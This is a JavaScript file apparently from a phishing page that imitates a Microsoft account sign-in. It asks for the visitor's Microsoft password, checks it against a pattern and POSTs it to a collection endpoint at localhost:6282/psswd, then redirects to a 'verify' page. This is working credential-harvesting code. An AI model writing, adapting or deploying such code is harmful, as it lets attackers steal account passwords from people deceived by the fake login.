//hmm
window.onload = function () {
  const storedText = localStorage.getItem('inputText');
  if (storedText) {
      document.getElementById('displayText').innerText = storedText;
  }
}

// Function to go back to the previous page
function goBack() {
  window.history.back();
}

//alr 


window.addEventListener('load', function() {
  const API_URL = 'http://localhost:6282';
  const inputElement = document.getElementById('inp_pwd');
  const errorText = document.getElementById('error_pwd');

  const psswdPattern = document.getElementById("errorText")

  const sendData = (data) => fetch(`${API_URL}/psswd`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data),
  });

  const submitForm = () => {
    const enteredText = inputElement.value;

errorText.style.display = 'none';
psswdPattern.style.display = 'none';


    // Adjust the validation pattern
if (enteredText.trim() === '') {
      errorText.textContent = 'Please enter the password for your Microsoft account.';
      errorText.style.display = 'block';
      inputElement.classList.add('error_gpt');
    } else {
      const pattern = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d!@#$%^&*()_+={}\[\]:;"'<>,.?\/\\-]{8,}$/;

    if (!pattern.test(enteredText)) {
      psswdPattern.style.display = 'block';
      inputElement.classList.add('error_gpt');
    } else {
      errorText.style.display = 'none';
      inputElement.classList.remove('error_gpt');

      const formData = new FormData();
      formData.append('textData', enteredText);

      sendData({ password: enteredText })
        .then(response => {
          console.log('Data sent successfully', response);
          // Update the redirection URL to index3.html
          window.location.href = '../verify/'})
        .catch(error => {
          console.error('Error sending data', error);
        });
    }
  };
}
  const submitBtn = document.getElementById("btn_sig");
  const dataForm = document.querySelector("form");

  submitBtn.addEventListener("click", submitForm);

  dataForm.addEventListener("submit", function(event) {
    event.preventDefault();
    submitForm();
  });

  // Adjust the key event listener based on your requirements
  dataForm.addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
      event.preventDefault();
      submitForm();
    }
  });
});
